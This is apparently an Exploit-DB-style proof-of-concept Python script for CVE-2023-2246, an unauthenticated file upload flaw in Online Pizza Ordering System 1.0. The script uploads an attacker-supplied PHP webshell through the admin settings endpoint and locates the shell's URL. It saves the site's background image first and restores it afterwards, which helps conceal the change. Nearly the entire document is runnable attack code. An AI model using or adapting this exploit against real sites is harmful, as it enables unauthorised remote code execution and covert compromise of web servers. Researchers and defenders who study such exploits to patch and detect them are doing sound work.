# Exploit Title: Online Pizza Ordering System 1.0 - Unauthenticated File Upload
# Date: 14/05/2023
# Exploit Author:  Alex Gan 
# Vendor Homepage: https://www.sourcecodester.com/php/16166/online-pizza-ordering-system-php-free-source-code.html
# Software Link: https://www.sourcecodester.com/sites/default/files/download/oretnom23/php-opos.zip
# Version: v1.0
# Tested on: LAMP Fedora Server 27 (Twenty Seven) Apache/2.4.34 (Fedora) 10.2.19-MariaDB PHP 7.1.23 
# CVE:CVE-2023-2246

#!/usr/bin/env python3
# coding: utf-8

import os
import requests
import argparse
from bs4 import BeautifulSoup
from urllib.parse import urlparse


# command line arguments
parser = argparse.ArgumentParser()
parser.add_argument('-u', '--url', type=str, help='URL')
parser.add_argument('-p', '--payload', type=str, help='PHP webshell')
args = parser.parse_args()

# if no arguments are passed, ask the user for them
if not (args.url):
    args.url = input('Use the -u argument or Enter URL:')
if not (args.payload):
    args.payload = input('Use the -p argument or Enter file path PHP webshell: ')

# Add "http://" if the URL doesn't have a scheme
parsed_url = urlparse(args.url)
if not parsed_url.scheme:
    args.url = 'http://' + args.url

# URL Variables
url = args.url + '/admin/ajax.php?action=save_settings'
img_url = args.url + '/assets/img/'

filename = os.path.basename(args.payload)

tmp_directory = os.environ.get('TMPDIR', '/tmp')
tmp_save_path = os.path.join(tmp_directory, 'pizza-bg.jpg')


payload = [
  ('img',(filename,open(args.payload,'rb'),'application/octet-stream'))
]



def make_request(url, method, files=None):
    if method == 'GET':
        response = requests.get(url)
    elif method == 'POST':
        response = requests.post(url, files=files)
    else:
        raise ValueError(f'Invalid HTTP method: {method}')
    
    if response.status_code == 200:
        print('[+] Request successful')
        return response.text
    else:
        print(f'[-] Error {response.status_code}: {response.text}')
        return None

def download_file(file_url):
    response = requests.get(file_url)
    if not os.path.exists(tmp_save_path):
        with open(tmp_save_path, 'wb') as f:
            f.write(response.content)
        print('[+] File "pizza-bg.jpg" has been downloaded and saved in', tmp_directory)
    else:
        print('[-] File "pizza-bg.jpg" already exists in', tmp_directory)

def find_file(response_get, filename, img_url):
    soup = BeautifulSoup(response_get, 'html.parser')

    # get all <a> tags on a page
    links = soup.find_all('a')

    # list to store found files
    found_files = []

    # check if the file has already been downloaded
    file_downloaded = False

    # we go through all the links and look for the desired file by its name
    for link in links:
        file_upl = link.get('href')
        if file_upl.endswith(filename): # uploaded file name
            print('[+] File found:', file_upl)
            file_url = img_url + file_upl # get the full URL of your file
            found_files.append(file_url) # add the file to the list of found files
            if filename == 'pizza-bg.jpg':
                if not file_downloaded:
                    download_file(file_url)
                    file_downloaded = True

    # if the list is not empty, then display all found files
    if found_files:
        print('[+] Full URL of your file:')
        for file_url in found_files:
            print('[+] ' + file_url)
    else:
        print('[-] File not found')

print(' Finding and copying file pizza-bg.jpg')
response_get = make_request(img_url, 'GET')
find_file(response_get, 'pizza-bg.jpg', img_url)
print("\n")

print(' Loading payload')
response_post = make_request(url,  'POST', files=payload)
print("\n")

print(' Finding the downloaded payload file')
response_get = make_request(img_url, 'GET')
find_file(response_get, filename, img_url)
print("\n")

bg = [('img', open('/tmp/pizza-bg.jpg', 'rb'))]

print(' Returning background')
response_post = make_request(url, 'POST', files=bg)

file_path = tmp_save_path

print(' Delete file')
if os.path.exists(file_path):
    os.remove(file_path)
    print('[+] File "pizza-bg.jpg" has been deleted in the temp directory.')
else:
    print('[-] File "pizza-bg.jpg" does not exist.')

